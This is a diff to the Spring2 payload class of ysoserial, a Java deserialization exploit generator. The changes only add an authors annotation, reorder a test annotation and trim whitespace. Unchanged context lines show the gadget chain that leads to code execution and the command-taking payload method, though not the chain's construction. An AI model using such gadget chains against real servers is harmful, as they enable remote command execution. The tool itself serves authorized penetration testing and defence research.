@@ -11,6 +11,7 @@ import javax.xml.transform.Templates;
 import org.springframework.aop.framework.AdvisedSupport;
 import org.springframework.aop.target.SingletonTargetSource;
 
+import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
@@ -20,9 +21,9 @@ import ysoserial.payloads.util.Reflections;
 
 
 /**
- * 
+ *
  * Just a PoC to proof that the ObjectFactory stuff is not the real problem.
- * 
+ *
  * Gadget chain:
  * TemplatesImpl.newTransformer()
  * Method.invoke(Object, Object...)
@@ -31,16 +32,17 @@ import ysoserial.payloads.util.Reflections;
  * $Proxy0.newTransformer()
  * Method.invoke(Object, Object...)
  * SerializableTypeWrapper$MethodInvokeTypeProvider.readObject(ObjectInputStream)
- * 
+ *
  * @author mbechler
  */
 
+@PayloadTest ( precondition = "isApplicableJavaVersion")
 @Dependencies ( {
-    "org.springframework:spring-core:4.1.4.RELEASE", "org.springframework:spring-aop:4.1.4.RELEASE", 
+    "org.springframework:spring-core:4.1.4.RELEASE", "org.springframework:spring-aop:4.1.4.RELEASE",
     // test deps
     "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2"
 } )
-@PayloadTest ( precondition = "isApplicableJavaVersion")
+@Authors({ Authors.MBECHLER })
 public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {
 
     public Object getObject ( final String command ) throws Exception {
@@ -67,9 +69,8 @@ public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {
     public static void main ( final String[] args ) throws Exception {
         PayloadRunner.run(Spring2.class, args);
     }
-    
+
     public static boolean isApplicableJavaVersion() {
         return JavaVersion.isAnnInvHUniversalMethodImpl();
     }
-
 }
